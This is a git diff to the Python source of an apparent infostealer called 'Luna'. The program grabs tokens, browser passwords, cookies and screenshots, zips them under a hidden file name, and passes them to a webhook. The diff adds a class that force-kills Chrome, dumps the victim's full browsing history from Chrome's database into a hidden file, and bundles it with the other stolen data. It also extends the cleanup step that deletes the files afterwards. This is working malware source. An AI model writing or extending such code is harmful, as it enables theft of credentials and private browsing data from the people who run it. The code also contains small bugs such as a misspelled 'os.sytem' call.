@@ -3,10 +3,11 @@ import difflib
 import platform
 import threading
 import uuid
-import psutil
 import requests
 import wmi
 import subprocess
+import sqlite3
+import psutil
 
 from json import loads
 from re import findall, match
@@ -39,7 +40,7 @@ def main(webhook):
     get_inf()
     grabtokens()
 
-    threads = [ss, grabpassword, cookies]
+    threads = [ss, grabpassword, cookies, history]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -356,7 +357,40 @@ class grabpassword():
             f.write("\n\nUsed Login Dbs:\n")
             f.write("\n".join(used_login_dbs))
 
+class history():
+    def __init__(self):
+        if "chrome.exe" in (p.name() for p in psutil.process_iter()):
+            os.sytem("taskkill /im chrome.exe /f")
 
+        with open("google-history.txt", "w") as f:
+            f.write("https://github.com/Smug246 | Google Chrome History\n\n")
+        hide(".\\google-history.txt")
+
+        username = os.getlogin()
+        dir="C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\".format(username)
+        history_db = os.path.join(dir, 'history')
+        c = sqlite3.connect(history_db)
+        cursor = c.cursor()
+        select_statement = "SELECT id,url,title FROM urls"
+        cursor.execute(select_statement)
+        results = cursor.fetchall()
+
+        ids = []
+        urls = []
+        titles = []
+        history = []
+   
+        for res in results:
+            id,url,title = res
+            history.append(f"{id} | Url: {url} | {title}")
+            ids.append(id)
+            urls.append(urls)
+            titles.append(title)
+        
+        with open(".\\google-history.txt", "a") as f:
+            f.write("\nAll Google Search History:\n")
+            f.write("\n".join(history))
+        
 class cookies():
     def __init__(self):
         self.appdata = os.getenv("localappdata")
@@ -430,11 +464,11 @@ class cookies():
             f.write("\n\nUsed Login Dbs:\n")
             f.write("\n".join(used_login_dbs))
 
-
 def zipup():    
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
         zipf.write("google-passwords.txt")
         zipf.write("google-cookies.txt")
+        zipf.write("google-history.txt")
         zipf.write("screenshot.png")
 
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
@@ -443,6 +477,7 @@ def zipup():
 def cleanup():
     for clean in [os.remove("google-passwords.txt"),
                   os.remove("google-cookies.txt"),
+                  os.remove("google-history.txt"),
                   os.remove("screenshot.png"),
                   os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
 
